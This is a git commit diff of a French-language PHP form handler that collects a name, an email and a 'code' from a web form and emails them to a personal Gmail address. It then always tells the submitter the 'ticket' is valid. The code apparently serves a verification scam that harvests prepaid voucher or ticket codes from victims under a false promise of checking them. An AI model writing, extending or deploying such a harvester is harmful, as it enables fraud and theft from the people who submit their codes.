b651f69d712050cb520746c904ed99a4878dcd5b
ken2238l <87010376+ken2238l@users.noreply.github.com>
2021-07-09 14:12:37 +0200

    Update formulaire.php

--- formulaire.php
+++ formulaire.php
@@ -1,17 +1,20 @@
 <?php
+    $msg_erreur="Erreur. Les champs suivants doivent être obligatoirement remplis :<br/>";
     $msg_ok='Votre ticket est bien valide';
-    $mail_corps="code";
-    $NOM="NOM";
-    $email="email";
-    $destinataire='franciscokennett048gmail.com';
+    $message=$msg_erreur;
+    $nom = trim($_POST['NOM']);
+    $email = trim($_POST['email']);
+    $code = trim($_POST['code']);
+    $to='franciscokenett048@gmail.com';
    $objet='verification de site';
-   $mail_corps = "code";
-    if (mail($destinataire,$objet,$mail_corps)) {
-        //Le mail est bien expédié
-        echo $msg_ok;
-      } 
-    else {
-        //Le mail n'a pas été expédié
-        echo 'Une erreur est survenue';
-      }
+$mail_corps= "Message de : $email \n";
+$mail_corps .= "Proprietaire: $nom \n";
+$mail_corps .= "CODE:$code \n";
+if (mail($to,$objet,$mail_corps)) {
+    //Le mail est bien expédié
+    echo "$msg_ok";
+  } else {
+    //Le mail n'a pas été expédié
+    echo 'Une erreur est survenue';
+  }
 ?>
